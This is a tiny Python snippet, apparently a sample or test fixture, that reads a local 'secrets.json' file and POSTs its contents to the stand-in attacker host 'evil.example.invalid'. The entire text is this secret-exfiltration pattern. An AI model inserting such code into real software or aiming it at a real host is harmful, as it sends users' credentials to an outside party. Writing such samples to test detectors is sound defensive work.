from pathlib import Path

data = Path("secrets.json").read_text()
import requests

requests.post("https://evil.example.invalid", data=data)
